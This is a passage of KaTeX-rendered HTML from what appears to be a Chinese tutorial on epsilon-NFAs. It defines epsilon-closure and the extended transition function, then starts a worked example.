mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>就是q可以不读入任何值直接进行状态转化到的状态的集合。</p></blockquote></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mo>∪</mo><mrow><mi>p</mi><mo>∈</mo><mi>P</mi></mrow></msub><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>u</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon-closure(P)=\cup_{p\in P} \epsilon-clousure(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></p><blockquote><p>上一条是单个状态的埃普西隆闭包。</p><p>这里扩充为了一个集合的埃普西隆闭包。实际上就是这个集合中所有状态的闭包之和，但是为了去重利用了并集运算。</p></blockquote></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">)</mo><mo>=</mo><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q,\epsilon)=\epsilon-closure(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>w</mi><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q,wa)=\epsilon-closure(P)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mo stretchy="false">{</mo><mi>p</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∃</mi><mi>r</mi><mo>∈</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P=\{p|\exists r\in \hat{\delta}(q,w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">p</span><span class="mord">∣</span><span class="mord">∃</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span> 使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>∈</mo><mi>δ</mi><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">p\in\delta(r,a)\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">}</span></span></span></span></p><p>= <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo>∪</mo><mrow><mi>r</mi><mo>∈</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>w</mi><mo stretchy="false">)</mo></mrow></msub><mi>δ</mi><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\cup_{r\in\hat{\delta}(q,w)}\delta(r,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.250716em;vertical-align:-0.5007159999999999em;"></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3742840000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mrel mtight">∈</span><span class="mord accent mtight"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-2.9634400000000003em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.19444em;"><span class="mtight">^</span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5007159999999999em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></p></li></ol><p>对于任意的(P, a)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∈</mo><msup><mn>2</mn><mi>Q</mi></msup><mo>×</mo><mo>∑</mo></mrow><annotation encoding="application/x-tex">\in 2^Q \times \sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.924661em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Q</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span></p><ol start="5"><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mo>∪</mo><mrow><mi>q</mi><mo>∈</mo><mi>P</mi></mrow></msub><mi>δ</mi><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\delta(P,a)=\cup_{q\in P}\delta(q,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></p><blockquote><p>这实际上非常好理解，P是一些状态的集合，这些状态们接收到了a进行状态转化，然后就是每个状态转化后转台的集合，因为一些状态可能会转化到同一个状态，所以用并集去重</p></blockquote></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>w</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mo>∪</mo><mrow><mi>q</mi><mo>∈</mo><mi>q</mi></mrow></msub><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta }(P,w)=\cup_{q\in q}\hat{\delta}(q,w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2439879999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22737000000000002em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span></p></li></ol><p>看到这么多概念你可能已经晕了，我们用下面这个例子来把以上的概念运用起来。</p><p><img src="https://upyun.wuuconix.link/image-20211109215953787.png" alt="例子" /></p><p>普通的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span>不必多说，直接看图就ok，比如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>遇到输入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>时就会转化为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>关键是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\delta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q_0,\epsilon)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mclose">)</span></span></span></span>要怎么求呢？</p><p>实际上这就是上面的定义3 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">)</mo><mo>=</mo><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q,\epsilon)=\epsilon-closure(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></p><p>故<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">)</mo><mo>=</mo><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q_0,\epsilon)=\epsilon-closure(q_0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 。</p><p>然后这个埃普西隆闭包怎么求呢，它的定义为那些和开始符号之间有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord 